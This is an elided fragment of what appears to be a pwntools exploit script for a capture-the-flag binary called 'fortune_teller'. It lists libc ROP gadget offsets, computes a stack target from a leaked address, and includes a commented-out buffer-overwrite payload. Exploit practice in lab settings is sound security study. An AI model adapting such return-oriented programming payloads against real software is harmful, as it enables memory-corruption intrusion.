...
exe = ELF("/var/challenges/fortune_teller/fortune_teller")
...
def main():
    ...
    RSP_Gadget = 0x000000000011c1ed + libc.address # add rsp, 0x418 ; ret
    LEAVE_Gadget = 0x00000000000578c8 + libc.address # leave ; ret
    POP_RBP_Gadget = 0x00000000001152b7 + libc.address # add rsp, 0x60 ; pop rbp ; ret

    POP_RDX_POP_R12_Gadget = 0x0000000000119431 + libc.address # pop rdx ; pop r12 ; ret
    POP_RAX_Gadget = 0x0000000000036174 + libc.address # pop rax ; ret
    POP_R12_Gadget = 0x000000000002f709 + libc.address # pop r12 ; ret
    ADD_RSP_Gadget_40 = 0x0000000000122b9b + libc.address # add rsp, 0x40 ; ret


    ADD_RSP_Gadget = 0x0000000000052c07 + libc.address # add rsp, 0xd8 ; ret
        
    log.info(f'RSP Gadget @ {hex(RSP_Gadget)}')
    ...
    stack_base = leaked_addr - stack_offset # this is our target location
    targe_address_offset = 0x00007ffd02515c50 - 0x00007ffd024f5000
    stack_target = stack_base + targe_address_offset
    ...
    #overwrite_fortune(r, str(120).encode() , b"B" * 0x20 + p64(POP_R12_Gadget) + b"C"*30)
